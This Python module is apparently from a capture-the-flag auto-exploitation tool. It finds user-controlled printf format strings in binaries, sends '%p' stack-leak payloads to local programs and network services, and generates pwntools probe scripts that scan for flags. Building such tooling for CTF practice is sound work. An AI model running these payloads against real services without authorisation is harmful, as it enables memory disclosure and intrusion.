"""Format-string auto-exploitation.

Finds a ``printf``-family call whose format argument is user-controlled
(Triage already flags these), then:

* for a local stdin program: probes ``%p`` offsets and dumps the stack,
  scanning the leak for a flag.
* for a network service: starts the server (via WSL on Windows), connects,
  and runs the same probe over the socket.

Anything that needs a real interactive shell is handed back as a
ready-to-run pwntools script plus the recon.
"""

from __future__ import annotations

import platform
import socket
import subprocess
import textwrap
import time
from dataclasses import dataclass, field

from triage_web.analysis import build_known_calls
from triage_web.autopwn.runner import _sh_quote, extract_flags, have_wsl, run_path, run_script, target_kind, to_wsl
from triage_web.engine import Disassembler
from triage_web.loader import BinaryLoader

_FMT_NAMES = {"printf", "fprintf", "dprintf", "vprintf", "vfprintf"}


@dataclass
class FmtResult:
    ok: bool
    flag: str | None = None
    fmt_site: int | None = None
    offset: int | None = None
    leak: str = ""
    script: str = ""
    reason: str = ""
    log: list[str] = field(default_factory=list)


def solve_format_string(
    path: str,
    *,
    host: str = "127.0.0.1",
    port: int | None = None,
    timeout: float = 60.0,
) -> FmtResult:
    ldr = BinaryLoader(path)
    log: list[str] = []
    try:
        info = ldr.get_info()
        disasm = _mk_disasm(info)
        site = _find_uncontrolled_printf(ldr, disasm, log)
        imports = {i["name"].split("@")[0] for i in ldr.get_imports()}
        is_net = bool({"socket", "bind", "listen", "accept"} & imports)

        script = _emit_probe_script(run_path(path), info, is_net, host, port)
        res = FmtResult(ok=False, fmt_site=site, script=script, log=log)
        can_run = target_kind(path) == "elf" and (have_wsl() or platform.system() == "Linux")

        if is_net and can_run:
            leak, flag = _probe_network(path, host, port, log)
            res.leak, res.flag, res.ok = leak, flag, flag is not None
            if not res.ok:
                res.reason = "started the service and probed %p offsets but saw no flag in the stack leak"
            return res

        if can_run:
            proc = run_script(script, timeout=timeout)
            res.leak = proc.text[:4000]
            flags = extract_flags(proc.stdout + proc.stderr)
            if flags:
                res.ok, res.flag = True, flags[0]
            else:
                res.reason = f"probe ran (rc={proc.returncode}) with no flag in the leak"
            return res

        res.reason = f"{info['arch']} / no runtime — probe script generated, run it against the target"
        return res
    finally:
        ldr.close()


def _mk_disasm(info) -> Disassembler | None:
    try:
        return Disassembler(arch=info["arch"], bits=info["bits"])
    except Exception:  # pragma: no cover
        return None


def _find_uncontrolled_printf(ldr, disasm, log) -> int | None:
    """First call to a printf-family PLT stub with no static .rodata format
    pointer set up right before it — i.e. the format is a variable."""
    if disasm is None:
        return None
    known = build_known_calls(ldr)
    fmt_slots = {a for a, n in known.items() if n.split("@")[0] in _FMT_NAMES}
    if not fmt_slots:
        return None
    try:
        code, base = ldr._get_text_section()
    except Exception:  # pragma: no cover
        return None
    is64 = ldr.get_info()["bits"] == 64
    insns = disasm.disassemble(code, base)
    for pos, insn in enumerate(insns):
        if insn["mnemonic"] not in ("call", "callq") or _hex(insn["op_str"]) not in fmt_slots:
            continue
        window = insns[max(0, pos - 6) : pos]
        loads_rodata = any(
            (is64 and i["mnemonic"] == "lea" and "rip" in i["op_str"])
            or (not is64 and i["mnemonic"] == "push" and i["op_str"].startswith("0x"))
            for i in window
        )
        if not loads_rodata:
            log.append(f"uncontrolled printf format at call {insn['address']:#x}")
            return insn["address"]
    return None


def _hex(op: str) -> int | None:
    try:
        return int(op.strip(), 16)
    except ValueError:
        return None


def _server_argv(path: str, port: int) -> list[str]:
    """Command that starts the ELF service, native on Linux and via WSL on
    Windows. Mirrors ``runner``'s runtime selection so a Linux host never
    shells out to a non-existent ``wsl``."""
    if platform.system() == "Linux":
        p = _sh_quote(str(path))
        return ["/bin/bash", "-lc", f"chmod +x {p} 2>/dev/null; exec {p} {port}"]
    wp = _sh_quote(to_wsl(path))
    return ["wsl", "-e", "bash", "-lc", f"chmod +x {wp}; exec {wp} {port}"]


def _probe_network(path, host, port, log) -> tuple[str, str | None]:
    """Start the ELF service, connect, send %p... and scan the reply."""
    port = port or 9999
    try:
        server = subprocess.Popen(_server_argv(path, port), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except OSError as exc:  # no runtime for the service (e.g. wsl missing)
        log.append(f"could not start the service: {exc}")
        return "", None
    try:
        time.sleep(1.3)
        leak = b""
        for probe in (b"%p." * 40 + b"\n", b"%s\n", b"%7$s\n", b"%11$s\n", b"%15$s\n"):
            try:
                with socket.create_connection((host, port), timeout=4) as s:
                    s.sendall(b"user\n")
                    time.sleep(0.2)
                    s.sendall(probe)
                    time.sleep(0.4)
                    leak += s.recv(8192)
            except OSError as exc:
                log.append(f"connect/probe failed: {exc}")
        flags = extract_flags(leak)
        return leak.decode("latin-1"), (flags[0] if flags else None)
    finally:
        server.terminate()


def _emit_probe_script(path, info, is_net, host, port) -> str:
    arch = {"x86_64": "amd64", "x86": "i386"}.get(info["arch"], info["arch"])
    if is_net:
        body = f'''
            import re, sys
            from pwn import context, remote
            context.update(arch="{arch}", log_level="warning")
            # start the service first:  {path} {port or 9999}
            io = remote({host!r}, {port or 9999})
            io.sendline(b"%p." * 60)
            try:
                data = io.recvall(timeout=5)
            except EOFError:
                data = b""
            io.close()
            sys.stdout.buffer.write(data)
            m = re.search(rb"(flag|FLAG|CTF)\\{{[^}}]*}}|FLAG-[\\w?.!-]+", data)
            print("\\nFLAG:", m.group(0).decode() if m else "not in this leak - widen %N$p range")
        '''
        return textwrap.dedent(body).strip() + "\n"

    # Local stdin target. The format-string sink may only run via argv, not
    # stdin (e.g. `int main(argc, argv) { if (argc > 1) vuln(argv[1]); }`),
    # which closes stdin almost immediately — sendline() can then raise
    # BrokenPipeError, not just EOFError on the later read. The %p payload
    # itself has no embedded NUL bytes, so (unlike a ret2win address write)
    # delivering it via a single argv element is always safe.
    body = f'''
        import re, sys
        from pwn import context, process
        context.update(arch="{arch}", log_level="warning")
        exe = {path!r}
        # Deliberately modest: the format-string argument is often also a
        # bounded-copy sink (e.g. strcpy'd into a small stack buffer before
        # the printf call) — a long %p.%p... payload can overflow that
        # buffer and crash the process before stdio flushes, silently
        # discarding the very leak it produced. 16 conversions (48 bytes)
        # fits inside the smallest buffers this still realistically needs
        # to probe; "widen %N$p range" below says what to do if it's not
        # enough for a specific target.
        PAYLOAD = b"%p." * 16

        def attempt(use_argv):
            p = process([exe, PAYLOAD] if use_argv else exe)
            try:
                if not use_argv:
                    p.sendline(PAYLOAD)
                data = p.recvall(timeout=5)
            except (EOFError, OSError):
                data = b""
            finally:
                p.close()
            return data

        FLAG = re.compile(rb"(flag|FLAG|CTF)\\{{[^}}]*}}|FLAG-[\\w?.!-]+")
        data = attempt(False)
        if not FLAG.search(data):
            data += b"\\n" + attempt(True)
        sys.stdout.buffer.write(data)
        m = FLAG.search(data)
        print("\\nFLAG:", m.group(0).decode() if m else "not in this leak - widen %N$p range")
    '''
    return textwrap.dedent(body).strip() + "\n"
